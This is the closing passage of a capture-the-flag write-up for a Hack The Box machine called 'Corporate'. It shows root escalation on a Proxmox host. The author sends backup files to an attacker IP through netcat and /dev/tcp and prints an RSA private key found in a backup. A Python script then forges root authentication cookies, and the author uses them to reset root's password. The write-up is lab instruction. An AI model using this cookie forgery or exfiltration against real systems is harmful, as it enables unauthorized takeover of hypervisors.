───────┴─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
```
```bash
❯ chmod 600 id_rsa-sysadmin-corporate.htb.key
❯ ssh -i id_rsa-sysadmin-corporate.htb.key sysadmin@10.9.0.1
The authenticity of host '10.9.0.1 (10.9.0.1)' can't be established.
ED25519 key fingerprint is SHA256:FwTxW8PRvlv2po/ED7VrukqvC83rPKEs8WY8zhgOIYU.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
<..SNIP..>
sysadmin@corporate:~$ 
```

# Access as root on corporate (host machine)

In /var/backups, there are two interesting backups, pve-host-2023_04_15-16_09_46.tar.gz and proxmox_backup_corporate_2023-04-15.15.36.28.tar.gz:

```bash
sysadmin@corporate:/var/backups$ ls -la | grep -vE 'dpkg.|apt.'
total 62728
drwxr-xr-x  4 root root     4096 Jul 19 06:25 .
drwxr-xr-x 12 root root     4096 Apr  8  2023 ..
-rw-r--r--  1 root root    51200 Jul 19 06:25 alternatives.tar.0
-rw-r--r--  1 root root     2415 Apr  9  2023 alternatives.tar.1.gz
-rw-r--r--  1 root root 62739772 Apr 15  2023 proxmox_backup_corporate_2023-04-15.15.36.28.tar.gz
-rw-r--r--  1 root root    76871 Apr 15  2023 pve-host-2023_04_15-16_09_46.tar.gz
drwx------  3 root root     4096 Apr  7  2023 slapd-2.4.57+dfsg-3+deb11u1
drwxr-xr-x  2 root root     4096 Apr  7  2023 unknown-2.4.57+dfsg-3+deb11u1-20230407-203136.ldapdb
```

I will transfer it to my machine and inspect them:

**Transfer proxmox_backup_corporate_2023-04-15.15.36.28.tar.gz**

Attacker:
```bash
❯ nc -lvnp 443 > proxmox_backup_corporate_2023-04-15.15.36.28.tar.gz
listening on [any] 443 ...
```

Victim:
```bash
sysadmin@corporate:/var/backups$ cat proxmox_backup_corporate_2023-04-15.15.36.28.tar.gz > /dev/tcp/10.10.14.133/443
```

**Transfer pve-host-2023_04_15-16_09_46.tar.gz**
Attacker:
```bash
❯ nc -lvnp 443 > pve-host-2023_04_15-16_09_46.tar.gz
listening on [any] 443 ...
```

Victim:
```bash
sysadmin@corporate:/var/backups$ cat pve-host-2023_04_15-16_09_46.tar.gz > /dev/tcp/10.10.14.133/443
```

Looking for vulnerabilities of the pve api, I found [this blogpost](https://starlabs.sg/blog/2022/12-multiple-vulnerabilites-in-proxmox-ve--proxmox-mail-gateway/) which is a research of various vulnerabilities at proxmox ve and proxmox mail gateway. It says [in this part](https://starlabs.sg/blog/2022/12-multiple-vulnerabilites-in-proxmox-ve--proxmox-mail-gateway/#privilege-escalation-in-pmg-via-unsecured-backup-file) that the cookie's format is PVE:{user}@{realm}:{hex(timestamp)} and the double colon separates plaintext and signature, where signature is generated using a private key stored at `/etc/pve/priv/authkey.key`, which is backup in the backup file. This is the case here:

```bash
❯ mkdir pve-host-backup
❯ mv pve-host-2023_04_15-16_09_46.tar.gz pve-host-backup
❯ cd pve-host-backup
❯ ls
pve-host-2023_04_15-16_09_46.tar.gz
❯ tar -xf pve-host-2023_04_15-16_09_46.tar.gz
tar: Removing leading `/' from member names
❯ rm pve-host-2023_04_15-16_09_46.tar.gz
```

We see etc folder, so there is probably `/etc/pve/priv/authkey.key` stored. And its so:

```bash
❯ ls
etc
❯ cd etc/pve/priv
❯ cat authkey.key
───────┬────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: authkey.key
───────┼────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ -----BEGIN RSA PRIVATE KEY-----
   2   │ MIIEowIBAAKCAQEA4qucBTokukm1jZuslN5hZKn/OEZ0Qm1hk+2OYe6WtjXpSQtG
   3   │ EY8mQZiWNp02UrVLOBhCOdW/PDM0O2aGZmlRbdN0QVC6dxGgE4lQD9qNKhFqHgdR
   4   │ Q0kExxMa8AiFNJQOd3XbLwE5cEcDHU3TC7er8Ea6VkswjGpxn9LhxuKnjAm81M4C
   5   │ frIcePe9zp7auYIVVOu0kNplXQV9T1l+h0nY/Ruch/g7j9sORzCcJpKviJbHGE7v
   6   │ OXxqKcxEOWntJmHZ8tVb4HC4r3xzhA06IRj3q/VrEj3H6+wa6iEfYJgp5flHtVA8
   7   │ 8TlXitfsBH+ZT41CH3/a6JudMYSLGKvatGgjJQIDAQABAoIBAQCBBoBcNVmctMJk
   8   │ ph2Z6+/ydhXyOaCKA2tM4idvNXmSpKNzUbiD3EFBi5LN6bV3ZP05JA3mj/Y4VUlB
   9   │ Gr4cY4zXgEsntsU9a8n79Oie7Z/3N0x5ZV7rdxACJazqv17bq/+EHpEyc3b3o2Rx
  10   │ dNBSVi3IKup8nnY3J4wgFtEv/eqzefDc4ODcDIz/j46eh/TZLll7zhesJ6Icfml3
  11   │ aZ3GjWdQWOwlj1rDCP7S/ehryNbB7p2T/FVHw6tbMf7XYtjlWzQbns+m9sQmrD3Q
  12   │ Lmw9zk7NyCuZi0/l8XiaJINv4VWFUuU4/KrifW7az81AAVcNLSKkg2AQ9Q3VSdyH
  13   │ z1p5Hz8tAoGBAP5wTIwhG781oHR3vu15OnoII9DFm80CtmeqA5mL2LzHB5Po2Osn
  14   │ wkspMpKioukFWcnwZO9330h/FSyv6zYJP/5QfwTkskEsYli6emdwJgb0C+HJYVVx
  15   │ /CWeDNvLhyNam0HcqzXMFzQhLfGaKoq4FZ95ozNOCv1K83G379o7VsRPAoGBAOQP
  16   │ sFdEEgDB/t0lnOEFfRSTwtJ2/IlLwBLMlm09aIwB7DqI9dl8fIcq8YR03XhGzIg0
  17   │ H28xf3b5Ql619VJ9YESRSq+F4VjuMzJpXJuHshR9wQZy8RDEtr43OwTBOG7sUNKi
  18   │ I0MBFxEmfaPeZCIZCLouam1JBNAA3YwFxlPm8WBLAoGAXOmtSk6cz0pJ+b3wns9y
  19   │ JzXpvkcrCcY/zcMr5VpIH0ee4MhaziSKst+sdBen3efyTefXNAtWIicmGFd1URo3
  20   │ oCrM94B8B4ipsTUHldZCTK+51w2u2YDyTtpUX78G7kYcBAUNEGwi3QpwuJVPi7CF
  21   │ VOMaUZXiNXS1SYWdtNeOa8kCgYA60g0SRN070s0wLo5Kv0amcwHRlJzHsIDmmFvH
  22   │ 6wm26pwJ8N8v69qWZi4KkrW4WtJP4tmkrSiJ//ntQZL3ZpzYsnyHzsjzTeRogSJA
  23   │ fvwgKtsJFcY1I/daEhanwEoU2eByoxzjIDnZ04qeJDLBVKGam3QZobabC04Y2jhv
  24   │ 1WW2BwKBgCD/j2QWr62kh48MY5hCG94YrZRiH1+WdJul+HpTXGax0kB8bXXehh7N
  25   │ n4+xaiJCTUElVEm2KH/7C8yKoytm8HR7eRrq7SJSbWEmvI/1Yhj1A9g2/vrCxOlm
  26   │ GtYXpgsbUgcGgg3Hr9/piitsBlSME6niawdxaMT9eLyLNUAnHRec
  27   │ -----END RSA PRIVATE KEY-----
───────┴────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
```

The blog post gives us a PoC script to exploit this, but it takes the private key from a LFI vulnerability where a low-priv user is needed. In this case, we don't need this because we have already gained access to the machine and we were able to see the authkey.key, so I will modify the script as follows:

```python
#!/usr/bin/python3
import pdb
import argparse
import requests
import json
import socket
import ssl
import urllib.parse
import re
import time
import subprocess
import base64
import tempfile
import urllib3

urllib3.disable_warnings()

burp = {'https': 'http://127.0.0.1:8080'}

def get_authkey():
    with open("/home/gabri/Desktop/HTB/machines/Corporate-10.10.11.246/content/backups/pve-host-backup/etc/pve/priv/authkey.key", "rb") as f:
        authkey_bytes = f.read()
    print(f'read authkey_bytes length: {len(authkey_bytes)}')
    return authkey_bytes


def generate_ticket(authkey_bytes, username='root@pam', time_offset=-30):
    timestamp = hex(int(time.time()) + time_offset)[2:].upper()
    plaintext = f'PVE:{username}:{timestamp}'

    authkey_path = tempfile.NamedTemporaryFile(delete=False)
    print(f'writing authkey to {authkey_path.name}')
    authkey_path.write(authkey_bytes)
    authkey_path.close()

    txt_path = tempfile.NamedTemporaryFile(delete=False)
    print(f'writing plaintext to {txt_path.name}')
    txt_path.write(plaintext.encode('utf-8'))
    txt_path.close()

    print(f'calling openssl to sign')
    sig = subprocess.check_output(
        ['openssl', 'dgst', '-sha1', '-sign', authkey_path.name, '-out', '-', txt_path.name])
    sig = base64.b64encode(sig).decode('latin-1')

    ret = f'{plaintext}::{sig}'
    print(f'generated ticket for {username}: {ret}')

    return ret


def exploit(target_url, generate_for):
    authkey_bytes = get_authkey()
    new_ticket = generate_ticket(authkey_bytes, username=generate_for)

    req = requests.get(target_url, headers={'Cookie': f'PVEAuthCookie={new_ticket}'}, proxies=burp, verify=False)
    res = req.content.decode('utf-8')
    verify_re = re.compile('UserName: \'(.*?)\',\n\s+CSRFPreventionToken:')
    verify_result = verify_re.findall(res)
    print(f'current user: {verify_result[0]}')
    print(f'Cookie: PVEAuthCookie={urllib.parse.quote_plus(new_ticket)}')



if __name__ == '__main__':
    target_url = 'https://10.9.0.1:8006'
    generate_for = 'root@pam'
    exploit(target_url, generate_for)

```

Execute it and we receive the cookie:

```bash
❯ python3 craft-pve-cookie.py
read authkey_bytes length: 1675
writing authkey to /tmp/tmppmm89j2d
writing plaintext to /tmp/tmprqn4sfo7
calling openssl to sign
generated ticket for root@pam: PVE:root@pam:669A8CFB::SKpIZcWNnAFLDXDCrlvpMHDHqUTaruR9cNx0R3C+3f9/zFqnZLTXdboUhfJkwXVdqJR+M6uqLRablqd/WGUReve91lJFx0JkJ7RRgSilK4T8HBYUqOXh1H30EpKRk2lbt1SvYwoW2wQkuh0xnHwZ44WRxnHYqsA04BKbuSF/SCsGc+HS7FySAbD2boIqYJmSauC0zl1gKKTNScQKJKv2gzSaIYLhGpuG1WtSVcbBP+RLibmF2GNcGrljJq3ri2mHRJz3+yNErCiU5Hypd373qUNwrbTV1dDYBbL4LHfi6vnl/bDJwB7zl+WYSy0n134LV4BjeymSVnpEA+wHQs98gw==
current user: root@þam
Cookie: PVEAuthCookie=PVE%3Aroot%40pam%3A669A8CFB%3A%3ASKpIZcWNnAFLDXDCrlvpMHDHqUTaruR9cNx0R3C%2B3f9%2FzFqnZLTXdboUhfJkwXVdqJR%2BM6uqLRablqd%2FWGUReve91lJFx0JkJ7RRgSilK4T8HBYUqOXh1H30EpKRk2lbt1SvYwoW2wQkuh0xnHwZ44WRxnHYqsA04BKbuSF%2FSCsGc%2BHS7FySAbD2boIqYJmSauC0zl1gKKTNScQKJKv2gzSaIYLhGpuG1WtSVcbBP%2BRLibmF2GNcGrljJq3ri2mHRJz3%2ByNErCiU5Hypd373qUNwrbTV1dDYBbL4LHfi6vnl%2FbDJwB7zl%2BWYSy0n134LV4BjeymSVnpEA%2BwHQs98gw%3D%3D
```

I will use it in a burp request and see the CSRFPreventionToken which is used to make requests to the API:

![csrf prevention token received](/assets/images/Corporate/csrf-prevention-token-received.png)

I searched for the proxmox api and I saw [this docs](https://pve.proxmox.com/pve-docs/api-viewer/) and testing with this cookie to this endpoint works:

![unsuccessfull api request](/assets/images/Corporate/unsuccessfull-api-request.png)
![successfull api request](/assets/images/Corporate/successfull-api-request.png)

An interesting api endpoint is [this](https://pve.proxmox.com/pve-docs/api-viewer/#/access/password) because I can change a password for any user (I will try root):

![unsuccessfull password change proxmox](/assets/images/Corporate/unsuccessfull-password-change-proxmox.png)

It says invalid csrf token so add it to a header and it works!:

![successfull password change proxmox](/assets/images/Corporate/successfull-password-change-proxmox.png)

Now we can login as root to the machine and view root.txt:

```bash
❯ sshpass -p 'password123$!' ssh root@10.9.0.1
Linux corporate 5.15.131-1-pve #1 SMP PVE 5.15.131-2 (2023-11-14T11:32Z) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Fri Jul 19 14:28:41 2024 from 10.8.0.2
root@corporate:~# cat root.txt 
02****************************84
```

That's the machine folks, hope you liked it!!
